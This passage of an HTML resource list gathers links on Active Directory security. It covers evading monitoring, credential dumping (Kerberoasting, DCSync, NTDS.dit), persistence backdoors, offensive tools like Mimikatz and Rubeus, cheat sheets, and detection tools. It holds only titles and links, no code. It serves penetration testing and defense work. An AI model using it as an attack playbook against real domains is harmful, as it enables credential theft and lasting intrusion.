data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL3NoaG1vbi1zaWxlbmNpbmctc3lzbW9uLXZpYS1kcml2ZXItdW5sb2FkLTY4MmI1YmU1NzY1MA==\">Shhmon — Silencing Sysmon via Driver Unload</span></li>\n</ul>\n<h3 id=\"honeytokens-evasion\"><a class=\"anchor\" href=\"#honeytokens-evasion\">#</a> HoneyTokens Evasion</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxOC8xMC9kZXBsb3ktZGVjZXB0aW9uLmh0bWw=\">Forging Trusts for Deception in Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qYmxvZy5qYXZlbGluLW5ldHdvcmtzLmNvbS9ibG9nL3RoZS1ob25leXBvdC1idXN0ZXIv\">Honeypot Buster: A Unique Red-Team Tool</span></li>\n</ul>\n<h3 id=\"disabling-security-tools\"><a class=\"anchor\" href=\"#disabling-security-tools\">#</a> Disabling Security Tools</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hsbGR6L0ludm9rZS1QaGFudDBt\">Invoke-Phant0m - Windows Event Log Killer</span></li>\n</ul>\n<hr />\n<h2 id=\"credential-dumping\"><a class=\"anchor\" href=\"#credential-dumping\">#</a> Credential Dumping</h2>\n<h3 id=\"ntdsdit-password-extraction\"><a class=\"anchor\" href=\"#ntdsdit-password-extraction\">#</a> NTDS.DIT Password Extraction</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD00NTE=\">How Attackers Pull the Active Directory Database (NTDS.dit) from a Domain Controller</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9leHRyYWN0aW5nLXBhc3N3b3JkLWhhc2hlcy1mcm9tLXRoZS1udGRzLWRpdC1maWxlLw==\">Extracting Password Hashes From The Ntds.dit File</span></li>\n</ul>\n<h3 id=\"sam-security-accounts-manager\"><a class=\"anchor\" href=\"#sam-security-accounts-manager\">#</a> SAM (Security Accounts Manager)</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VsYWRzaGFtaXIvSW50ZXJuYWwtTW9ub2xvZ3Vl\">Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS</span></li>\n</ul>\n<h3 id=\"kerberoasting\"><a class=\"anchor\" href=\"#kerberoasting\">#</a> Kerberoasting</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9wb3dlcnNoZWxsL2tlcmJlcm9hc3Rpbmctd2l0aG91dC1taW1pa2F0ei8=\">Kerberoasting Without Mimikatz</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMjkz\">Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9leHRyYWN0aW5nLXNlcnZpY2UtYWNjb3VudC1wYXNzd29yZHMtd2l0aC1rZXJiZXJvYXN0aW5nLw==\">Extracting Service Account Passwords With Kerberoasting</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3liZXJhcmsuY29tL2Jsb2cvY3JhY2tpbmctc2VydmljZS1hY2NvdW50LXBhc3N3b3Jkcy1rZXJiZXJvYXN0aW5nLw==\">Cracking Service Account Passwords with Kerberoasting</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZWRlcm1pL2Y4YjE0M2IxMWRjMDIwYjg1NDE3OGQzODA5Y2Y5MWI1\">Kerberoast PW list for cracking passwords with complexity requirements</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvaGFybWoweS9kZXJieWNvbi0yMDE5LWtlcmJlcm9hc3RpbmctcmV2aXNpdGVk\">DerbyCon 2019 - Kerberoasting Revisited</span></li>\n</ul>\n<h3 id=\"kerberos-ap-rep-roasting\"><a class=\"anchor\" href=\"#kerberos-ap-rep-roasting\">#</a> Kerberos AP-REP Roasting</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL2FjdGl2ZWRpcmVjdG9yeS9yb2FzdGluZy1hcy1yZXBzLw==\">Roasting AS-REPs</span></li>\n</ul>\n<h3 id=\"windows-credential-managervault\"><a class=\"anchor\" href=\"#windows-credential-managervault\">#</a> Windows Credential Manager/Vault</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL29wZXJhdGlvbmFsLWd1aWRhbmNlLWZvci1vZmZlbnNpdmUtdXNlci1kcGFwaS1hYnVzZS8=\">Operational Guidance for Offensive User DPAPI Abuse</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXN0YW1vdXNlLm1lLzIwMTcvMDgvanVtcGluZy1uZXR3b3JrLXNlZ3JlZ2F0aW9uLXdpdGgtcmRwLw==\">Jumping Network Segregation with RDP</span></li>\n</ul>\n<h3 id=\"dcsync\"><a class=\"anchor\" href=\"#dcsync\">#</a> DCSync</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL21pbWlrYXR6LWFuZC1kY3N5bmMtYW5kLWV4dHJhc2lkcy1vaC1teS8=\">Mimikatz and DCSync and ExtraSids, Oh My</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNzI5\">Mimikatz DCSync Usage, Exploitation, and Detection</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMDUz\">Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync</span></li>\n</ul>\n<h3 id=\"llmnrnbt-ns-poisoning\"><a class=\"anchor\" href=\"#llmnrnbt-ns-poisoning\">#</a> LLMNR/NBT-NS Poisoning</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuNGFybWVkLmNvbS9ibG9nL2xsbW5yLW5idG5zLXBvaXNvbmluZy11c2luZy1yZXNwb25kZXIv\">LLMNR/NBT-NS Poisoning Using Responder</span></li>\n</ul>\n<h3 id=\"others\"><a class=\"anchor\" href=\"#others\">#</a> Others</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9jb21wcm9taXNpbmctcGxhaW4tdGV4dC1wYXNzd29yZHMtaW4tYWN0aXZlLWRpcmVjdG9yeQ==\">Compromising Plain Text Passwords In Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZmlyZWV5ZS5jb20vYmxvZy90aHJlYXQtcmVzZWFyY2gvMjAyMC8wNC9rZXJiZXJvcy10aWNrZXRzLW9uLWxpbnV4LXJlZC10ZWFtcy5odG1s\">Kerberos Tickets on Linux Red Teams</span></li>\n</ul>\n<hr />\n<h2 id=\"persistence\"><a class=\"anchor\" href=\"#persistence\">#</a> Persistence</h2>\n<h3 id=\"golden-ticket\"><a class=\"anchor\" href=\"#golden-ticket\">#</a> Golden Ticket</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxOC8wNC8wOS9nb2xkZW4tdGlja2V0Lw==\">Golden Ticket</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNjQw\">Kerberos Golden Tickets are Now More Golden</span></li>\n</ul>\n<h3 id=\"sid-history\"><a class=\"anchor\" href=\"#sid-history\">#</a> SID History</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNzcy\">Sneaky Active Directory Persistence #14: SID History</span></li>\n</ul>\n<h3 id=\"silver-ticket\"><a class=\"anchor\" href=\"#silver-ticket\">#</a> Silver Ticket</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMDEx\">How Attackers Use Kerberos Silver Tickets to Exploit Systems</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yNzUz\">Sneaky Active Directory Persistence #16: Computer Accounts &amp; Domain Controller Silver Tickets</span></li>\n</ul>\n<h3 id=\"dcshadow-2\"><a class=\"anchor\" href=\"#dcshadow-2\">#</a> DCShadow</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9jcmVhdGluZy1wZXJzaXN0ZW5jZS13aXRoLWRjc2hhZG93Lw==\">Creating Persistence With Dcshadow</span></li>\n</ul>\n<h3 id=\"adminsdholder\"><a class=\"anchor\" href=\"#adminsdholder\">#</a> AdminSDHolder</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xOTA2\">Sneaky Active Directory Persistence #15: Leverage AdminSDHolder &amp; SDProp to (Re)Gain Domain Admin Rights</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9wZXJzaXN0ZW5jZS11c2luZy1hZG1pbnNkaG9sZGVyLWFuZC1zZHByb3Av\">Persistence Using Adminsdholder And Sdprop</span></li>\n</ul>\n<h3 id=\"group-policy-object\"><a class=\"anchor\" href=\"#group-policy-object\">#</a> Group Policy Object</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yNzE2\">Sneaky Active Directory Persistence #17: Group Policy</span></li>\n</ul>\n<h3 id=\"skeleton-keys\"><a class=\"anchor\" href=\"#skeleton-keys\">#</a> Skeleton Keys</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS91bmxvY2tpbmctYWxsLXRoZS1kb29ycy10by1hY3RpdmUtZGlyZWN0b3J5LXdpdGgtdGhlLXNrZWxldG9uLWtleS1hdHRhY2sv\">Unlocking All The Doors To Active Directory With The Skeleton Key Attack</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxOC8wNC8xMC9za2VsZXRvbi1rZXkv\">Skeleton Key</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xMjc1\">Attackers Can Now Use Mimikatz to Implant Skeleton Key on Domain Controllers &amp; BackDoor Your Active Directory Forest</span></li>\n</ul>\n<h3 id=\"seenabledelegationprivilege\"><a class=\"anchor\" href=\"#seenabledelegationprivilege\">#</a> SeEnableDelegationPrivilege</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9hY3RpdmVkaXJlY3RvcnkvdGhlLW1vc3QtZGFuZ2Vyb3VzLXVzZXItcmlnaHQteW91LXByb2JhYmx5LWhhdmUtbmV2ZXItaGVhcmQtb2Yv\">The Most Dangerous User Right You (Probably) Have Never Heard Of</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1PaXFhTzlSSHNrVQ==\">SeEnableDelegationPrivilege Active Directory Backdoor</span></li>\n</ul>\n<h3 id=\"security-support-provider\"><a class=\"anchor\" href=\"#security-support-provider\">#</a> Security Support Provider</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNzYw\">Sneaky Active Directory Persistence #12: Malicious Security Support Provider (SSP)</span></li>\n</ul>\n<h3 id=\"directory-services-restore-mode\"><a class=\"anchor\" href=\"#directory-services-restore-mode\">#</a> Directory Services Restore Mode</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNzE0\">Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNzg1\">Sneaky Active Directory Persistence #13: DSRM Persistence v2</span></li>\n</ul>\n<h3 id=\"acls-security-descriptors\"><a class=\"anchor\" href=\"#acls-security-descriptors\">#</a> ACLs &amp; Security Descriptors</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTcvd2VkbmVzZGF5L3VzLTE3LVJvYmJpbnMtQW4tQUNFLVVwLVRoZS1TbGVldmUtRGVzaWduaW5nLUFjdGl2ZS1EaXJlY3RvcnktREFDTC1CYWNrZG9vcnMtd3AucGRm\">An ACE Up the Sleeve: Designing Active Directory DACL Backdoors</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3liZXJhcmsuY29tL3RocmVhdC1yZXNlYXJjaC1ibG9nL3NoYWRvdy1hZG1pbnMtc3RlYWx0aHktYWNjb3VudHMtZmVhci8=\">Shadow Admins – The Stealthy Accounts That You Should Fear The Most</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvaGFybWoweS90aGUtdW5pbnRlbmRlZC1yaXNrcy1vZi10cnVzdGluZy1hY3RpdmUtZGlyZWN0b3J5\">The Unintended Risks of Trusting Active Directory</span></li>\n</ul>\n<h2 id=\"tools-scripts\"><a class=\"anchor\" href=\"#tools-scripts\">#</a> Tools &amp; Scripts</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9ibG9iL21hc3Rlci9SZWNvbi9Qb3dlclZpZXcucHMx\">PowerView</span> - Situational Awareness PowerShell framework</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5k\">BloodHound</span> - Six Degrees of Domain Admin</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyZUF1dGhDb3JwL2ltcGFja2V0\">Impacket</span> - Impacket is a collection of Python classes for working with network protocols</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZveC1pdC9hY2xwd24ucHk=\">aclpwn.py</span> - Active Directory ACL exploitation with BloodHound</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2J5dDNibDMzZDNyL0NyYWNrTWFwRXhlYw==\">CrackMapExec</span> - A swiss army knife for pentesting networks</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Nhbml4MS9BREFDTFNjYW5uZXI=\">ADACLScanner</span> - A tool with GUI or command linte used to create reports of access control lists (DACLs) and system access control lists (SACLs) in Active Directory</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N5YmVyYXJrL3pCYW5n\">zBang</span> - zBang is a risk assessment tool that detects potential privileged account threats</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dob3N0UGFjay9TYWZldHlLYXR6\">SafetyKatz</span> - SafetyKatz is a combination of slightly modified version of @gentilkiwi's Mimikatz project and @subTee's .NET PE Loader.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dob3N0UGFjay9TaGFycER1bXA=\">SharpDump</span> - SharpDump is a C# port of PowerSploit's Out-Minidump.ps1 functionality.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05ldFNQSS9Qb3dlclVwU1FM\">PowerUpSQL</span> - A PowerShell Toolkit for Attacking SQL Server</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dob3N0UGFjay9SdWJldXM=\">Rubeus</span> -  Rubeus is a C# toolset for raw Kerberos interaction and abuses</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlLW9mLXNlY3VyaXR5L0FEUmVjb24=\">ADRecon</span> - A tool which gathers information about the Active Directory and generates a report which can provide a holistic picture of the current state of the target AD environment</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kvbWltaWthdHo=\">Mimikatz</span> - Utility to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory but also perform pass-the-hash, pass-the-ticket or build Golden tickets</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2wwc3MvR3JvdXBlcg==\">Grouper</span> - A PowerShell script for helping to find vulnerable settings in AD Group Policy.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0tldmluLVJvYmVydHNvbi9Qb3dlcm1hZA==\">Powermad</span> - PowerShell MachineAccountQuota and DNS exploit tools</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL1JBQ0U=\">RACE</span> - RACE is a PowerShell module for executing ACL attacks against Windows targets.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21kYXZpczMzMi9Eb21haW5QYXNzd29yZFNwcmF5\">DomainPasswordSpray</span> - DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RhZnRoYWNrL01haWxTbmlwZXI=\">MailSniper</span> - MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.)</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xlb2xvb2JlZWsvTEFQU1Rvb2xraXQ=\">LAPSToolkit</span> - Tool to audit and attack LAPS environments.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NyZWREZWZlbnNlL0NyZWREZWZlbnNl\">CredDefense</span> - Credential and Red Teaming Defense for Windows Environments</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL2xkYXBkb21haW5kdW1w\">ldapdomaindump</span> - Active Directory information dumper via LDAP</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xlZWNocmlzdGVuc2VuL1Nwb29sU2FtcGxlLw==\">SpoolSample</span> - PoC tool to coerce Windows hosts authenticate to other machines via the MS-RPRN RPC interface</li>\n</ul>\n<h2 id=\"ebooks\"><a class=\"anchor\" href=\"#ebooks\">#</a> Ebooks</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXJudy5kZS9kb3dubG9hZC9CbG9vZEhvdW5kV29ya3Nob3AvRVJOV19Eb2dXaGlzcGVyZXJIYW5kYm9vay5wZGY=\">The Dog Whisperer’s Handbook – A Hacker’s Guide to the BloodHound Galaxy</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmFyb25pcy5jb20vYmxvZy92YXJvbmlzLWVib29rLXBlbi10ZXN0aW5nLWFjdGl2ZS1kaXJlY3RvcnktZW52aXJvbm1lbnRzLw==\">Varonis eBook: Pen Testing Active Directory Environments</span></li>\n</ul>\n<h2 id=\"cheat-sheets\"><a class=\"anchor\" href=\"#cheat-sheets\">#</a> Cheat Sheets</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hhcm1KMHkvQ2hlYXRTaGVldHM=\">Tools Cheat Sheets</span> - Tools (PowerView, PowerUp, Empire, and PowerSploit)</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NhZFByb2Nlc3Nvci9DaGVhdHMvYmxvYi9tYXN0ZXIvRG9nV2hpc3BlcmVyVjIubWQ=\">DogWhisperer - BloodHound Cypher Cheat Sheet (v2)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vSGFybUoweS8xODRmOTgyMmIxOTVjNTJkZDUwYzM3OWVkMzExNzk5Mw==\">PowerView-3.0 tips and tricks</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vSGFybUoweS8zMzI4ZDk1NDYwN2Q3MTM2MmUzYw==\">PowerView-2.0 tips and tricks</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Njb3ViaS9CbG9vZGhvdW5kQUQtUXVlcmllcw==\">BloodhoundAD-Queries</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vVGFybG9naWNTZWN1cml0eS8yZjIyMTkyNGZlZjhjMTRhMWQ4ZTI5ZjNjYjVjNWM0YQ==\">Kerberos Attacks Cheat Sheet</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYXVzZWMuY29tLzIwMTkvMDkvMDkvYmxvb2Rob3VuZC1jeXBoZXItY2hlYXRzaGVldC8=\">Bloodhound Cypher Cheatsheet</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20va25ldGh0ZW8vMmZjOGFmNmVhMjgxOTlmZDYzYTUyOWE3M2E0MTc2Yzc=\">Kerberos cheatsheet</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0ludGVncmF0aW9uLUlUL0FjdGl2ZS1EaXJlY3RvcnktRXhwbG9pdGF0aW9uLUNoZWF0LVNoZWV0\">Active Directory Exploitation Cheat Sheet</span></li>\n</ul>\n<h2 id=\"other-resources\"><a class=\"anchor\" href=\"#other-resources\">#</a> Other Resources</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMWoyblcwNUgtaVJ6Ny1GVlRSaC1MQlhRbTZNNllJQlFOV2E0Vjd0cDk5WVEv\">Tactics, Techniques and Procedures for Attacking Active Directory BlackHat Asia 2019</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGVudGVzdHBhcnRuZXJzLmNvbS9zZWN1cml0eS1ibG9nL2Jsb29kaG91bmQtd2Fsa3Rocm91Z2gtYS10b29sLWZvci1tYW55LXRyYWRlY3JhZnRzLw==\">Bloodhound walkthrough. A Tool for Many Tradecrafts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMzYy\">Attack Methods for Gaining Domain Admin Rights in Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvbmV0dGl0dWRlX2xhYnMvcG93ZXJzaGVsbGlzZGVhZGVwaWNsZWFybmluZ3Nsb25kb24=\">PowerShell Is Dead Epic Learnings</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMWxRSFRxWFpJRHh3YUlVblhkTy1FZHZHcDc5UnpIMXJiTTR6RTQ1S2tpMkkvZWRpdCNzbGlkZT1pZC5nMzVmMzkxMTkyXzAw\">Finding Our Path: How We’re Trying to Improve Active Directory Security</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1KY0ZkTkFsZUlrNCZhbXA7ZmVhdHVyZT15b3V0dS5iZQ==\">SteelCon 2019: Getting Splunky With Kerberos - Ross Bingham and Tom MacDonald</span></li>\n</ul>\n<hr />\n<h2 id=\"defense-detection\"><a class=\"anchor\" href=\"#defense-detection\">#</a> Defense &amp; Detection</h2>\n<h3 id=\"tools-scripts-2\"><a class=\"anchor\" href=\"#tools-scripts-2\">#</a> Tools &amp; Scripts</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nb2ZpbGUuaW8vZC9JQUtETG4=\">Invoke-TrimarcADChecks</span> - The Invoke-TrimarcADChecks.ps1 PowerShell script is designed to gather data from a single domain AD forest to performed Active Directory Security Assessment (ADSA).</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RhdmlkcHJvd2UvQURfU2VjX1Rvb2xz\">Create-Tiers in AD</span> - Project Title Active Directory Auto Deployment of Tiers in any environment</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nYWxsZXJ5LnRlY2huZXQubWljcm9zb2Z0LmNvbS9TQU1SaTEwLUhhcmRlbmluZy1SZW1vdGUtNDhkOTRiNWI=\">SAMRi10</span>  - Hardening SAM Remote Access in Windows 10/Server 2016</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nYWxsZXJ5LnRlY2huZXQubWljcm9zb2Z0LmNvbS9OZXQtQ2Vhc2UtQmxvY2tpbmctTmV0LTFlOGRjYjVi\">Net Cease</span>  - Hardening Net Session Enumeration</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGluZ2Nhc3RsZS5jb20v\">PingCastle</span> - A tool designed to assess quickly the Active Directory security level with a methodology based on risk assessment and a maturity framework</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nYWxsZXJ5LnRlY2huZXQubWljcm9zb2Z0LmNvbS9Bb3JhdG8tU2tlbGV0b24tS2V5LTI0ZTQ2Yjcz\">Aorato Skeleton Key Malware Remote DC Scanner</span> - Remotely scans for the existence of the Skeleton Key Malware</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nYWxsZXJ5LnRlY2huZXQubWljcm9zb2Z0LmNvbS9SZXNldC10aGUta3JidGd0LWFjY291bnQtNTgxYTllNTE=\">Reset the krbtgt account password/keys</span> - This script will enable you to reset the krbtgt account password and related keys while minimizing the likelihood of Kerberos authentication issues being caused by the operation</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nYWxsZXJ5LnRlY2huZXQubWljcm9zb2Z0LmNvbS9SZXNldC1UaGUtS3JiVGd0LUFjY291bnQtNWY0NWE0MTQ=\">Reset The KrbTgt Account Password/Keys For RWDCs/RODCs</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N5YmVyYXJrL1Jpc2t5U1BO\">RiskySPN</span> - RiskySPNs is a collection of PowerShell scripts focused on detecting and abusing accounts associated with SPNs (Service Principal Name).</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL0RlcGxveS1EZWNlcHRpb24=\">Deploy-Deception</span> -  A PowerShell module to deploy active directory decoy objects</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ZsZXRvdXgvU3Bvb2xlclNjYW5uZXI=\">SpoolerScanner</span> - Check if MS-RPRN is remotely available with powershell/c#</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NlY3VyZXdvcmtzL2RjZXB0\">dcept</span> - A tool for deploying and detecting use of Active Directory honeytokens</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pQQ0VSVENDL0xvZ29uVHJhY2Vy\">LogonTracer</span> - Investigate malicious Windows logon by visualizing and analyzing Windows event log</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NoZWxsc3Rlci9EQ1NZTkNNb25pdG9y\">DCSYNCMonitor</span> - Monitors for DCSYNC and DCSHADOW attacks and create custom Windows Events for these events</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05lbzIzeDAvc2lnbWEv\">Sigma</span> - Generic Signature Format for SIEM Systems</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9zeXNtb24=\">Sysmon</span> - System Monitor (Sysmon) is a Windows system service and device driver that, once installed on a system, remains resident across system reboots to monitor and log system activity to the Windows event log.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pQQ0VSVENDL1N5c21vblNlYXJjaA==\">SysmonSearch</span> - Investigate suspicious activity by visualizing Sysmon's event log</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VuZGdhbWVpbmMvQ2xyR3VhcmQ=\">ClrGuard</span> - ClrGuard is a proof of concept project to explore instrumenting the Common Language Runtime (CLR) for security purposes.</li>\n<li><span 